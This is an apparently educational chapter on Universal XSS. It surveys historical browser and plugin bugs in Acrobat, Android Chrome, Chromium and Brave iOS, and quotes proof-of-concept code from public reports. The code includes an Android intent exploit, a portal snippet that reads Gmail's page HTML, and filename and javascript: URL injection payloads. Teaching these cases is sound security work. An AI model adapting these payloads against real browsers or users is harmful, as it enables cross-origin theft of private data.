---
sidebar_position: 12
---

# The Strongest XSS: Universal XSS

All the XSS vulnerabilities we mentioned earlier are mostly caused by negligence on the part of the website itself, allowing attackers to execute JavaScript code on the website.

However, there is another type of XSS that is even more powerful, as the title suggests: Universal XSS.

The reason is simple: this type of XSS attack targets not the website itself, but the browser or built-in plugins.

Since it is a vulnerability in the browser, the website itself does not need to have any issues. Even a purely static webpage can be vulnerable to XSS. By attacking the browser, the impact achieved is "the ability to execute code on any website." Therefore, this type of attack is called Universal XSS, or UXSS for short.

So how are UXSS vulnerabilities created? Let's look at a few examples.

## Firefox's Adobe Acrobat Plugin in 2006

In a paper titled [Subverting Ajax](https://fahrplan.events.ccc.de/congress/2006/Fahrplan/attachments/1158-Subverting_Ajax.pdf), a UXSS targeting Firefox is described.

The Adobe Acrobat plugin on Firefox had a vulnerability where it did not properly check parameters. By loading a PDF and appending the parameter `#FDF=javascript:alert(1)` to the URL, XSS could be executed within that PDF.

For example, `https://example.com/test.pdf#FDF=javascript:alert(1)`. Simply loading this URL would execute JavaScript code on the origin `https://example.com`, which is known as UXSS.

Although the original paper did not provide detailed information, I assume the underlying principle is that the plugin uses the value passed by the `FDF` parameter to execute functions like `window.open`, allowing the execution of code using the `javascript:` pseudo-protocol.

## Android Chrome's UXSS in 2012

In 2012, Takeshi reported a vulnerability: [Issue 144813: Security: UXSS via com.android.browser.application_id Intent extra](https://bugs.chromium.org/p/chromium/issues/detail?id=144813).

In the world of Android, there is something called an "intent," which represents an "intention." For example, if you want to open a new screen, you send an intent saying "I want to open a new screen."

If you want to open Chrome and browse a specific page, you can write corresponding code based on this intention:

``` java
// 宣告新的 intent
Intent intent = new Intent("android.intent.action.VIEW");

// intent 要傳給的對象是 Chrome app
intent.setClassName("com.android.chrome", "com.google.android.apps.chrome.Main");

// 設置要開啟的 URL
intent.setData(Uri.parse("https://example.com"));

// 開啟
startActivity(intent);
```

In 2012, someone discovered that by first opening `https://example.com` and then opening `javascript:alert(1)`, code could be executed on the `https://example.com` URL, resulting in a UXSS vulnerability.

The complete code looks like this (code from the original report):

``` java
package jp.mbsd.terada.attackchrome1;

import android.app.Activity;
import android.os.Bundle;
import android.content.Intent;
import android.net.Uri;

public class Main extends Activity {
    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        doit();
    }

    public void doit() {
        try {
            // Firstly, force chrome app to open a target Web page
            Intent intent1 = getIntentForChrome("http://www.google.com/1");
            startActivity(intent1);

            // Wait a few seconds
            Thread.sleep(5000);

            // JS code to inject into the target (www.google.com)
            String jsURL = "javascript:alert('domain='+document.domain)";

            Intent intent2 = getIntentForChrome(jsURL);

            // Need a trick to prevent Chrome from loading the new URL in a new tab
            intent2.putExtra("com.android.browser.application_id", "com.android.chrome");

            startActivity(intent2);
        }
        catch (Exception e) {}
    }

    // Get intent to invoke chrome app
    public Intent getIntentForChrome(String url) {
        Intent intent = new Intent("android.intent.action.VIEW");
        intent.setClassName("com.android.chrome", "com.google.android.apps.chrome.Main");
        intent.setData(Uri.parse(url));
        return intent;
    }
}
```

## Chromium's UXSS via portal in 2019

In 2019, Michał Bentkowski reported a vulnerability: [Issue 962500: Security: Same Origin Policy bypass and local file disclosure via portal element](https://bugs.chromium.org/p/chromium/issues/detail?id=962500&q=sop%20bypass&can=1). This UXSS was executed through the latest feature `<portal>`.

The cause of this vulnerability is similar to the Android case mentioned earlier. Here is an example code snippet (from the original report):

``` js
const p = document.createElement('portal');
p.src = 'https://mail.google.com';
// after a while:
p.src = 'javascript:portalHost.postMessage(document.documentElement.outerHTML,"*")';
// the code above will get executed in the context of https://mail.google.com
```

When you load a URL inside a portal and then load `javascript:`, it will execute JavaScript on the origin of the previously loaded URL. In other words, you can execute JavaScript on any URL, making it a UXSS. This vulnerability was rewarded with a $10,000 bounty.

## Chromium's UXSS triggered by downloading images in 2021

When you right-click on an image in Chromium and choose to download it, Chromium dynamically executes a piece of JavaScript code in the background. It calls internal JavaScript functions, like this:

``` js
__gCrWeb.imageFetch.getImageData(id, '%s')
```

Here, `%s` is the filename of the image. However, this filename was not properly filtered, so if the filename is `'+alert(1)+'`, the code will become:

``` js
__gCrWeb.imageFetch.getImageData(id, ''+alert(1)+'')
```

This will execute `alert(1)`. Of course, you can replace it with any code. `alert(1)` is just an example.

In addition, if there is a domain A that embeds domain B using an iframe, when you download an image on domain B, this dynamically generated JavaScript code will be executed in the top-level window, which is the domain A's window.

In other words, by exploiting this vulnerability, if I can embed my attack URL in another domain using an iframe, I can execute arbitrary code on that domain, resulting in UXSS.

The original report and PoC can be found in the report by Muneaki Nishimura: [Issue 1164846: Security: ImageFetchTabHelper::GetImageDataByJs allows child frames to inject scripts into parent (UXSS)](https://bugs.chromium.org/p/chromium/issues/detail?id=1164846)

## Multiple UXSS in Brave Browser iOS App

Brave is a privacy-focused browser based on Chromium, founded by Brendan Eich, the creator of JavaScript. The iOS app of Brave has been found to have multiple UXSS vulnerabilities by Japanese security researcher Muneaki Nishimura (he also reported the UXSS in Chromium mentioned above).

The cause of these vulnerabilities is similar to what was mentioned earlier. It is due to the app dynamically executing JavaScript code without properly filtering the input, resulting in the generation of UXSS.

For example, there might be a piece of code like this:

``` swift
self.tab?.webview?.evaluateJavaScript("u2f.postLowLevelRegister(\(requestId), \(true), '\(version)')")
```

And we can control the `version` variable. At the same time, this script is executed at the top level, allowing sub frames to attack the parent and perform XSS on other origins.

For more details, refer to Muneaki Nishimura's presentation: [Brave Browserの脆弱性を見つけた話（iOS編）](https://speakerdeck.com/nishimunea/brave-browsernocui-ruo-xing-wojian-tuketahua-iosbian)

## Conclusion

UXSS vulnerabilities like these are usually beyond the control of websites because the vulnerability lies in the browser itself, not the website.

For browsers, this is actually a significant vulnerability. Just think about it, if an attacker successfully exploits UXSS, they can read your Gmail, read your Facebook messages, and take away all your data. It is a very frightening situation.

As users, all we can do is keep our browsers updated to the latest version and hope that vendors promptly fix these vulnerabilities.

UXSS vulnerabilities are relatively severe and there are fewer cases. Most of them are from a long time ago (e.g., ten years ago). You can try to find UXSS vulnerabilities that have occurred in the past (excluding the ones mentioned above) and share them with others in the comments section.
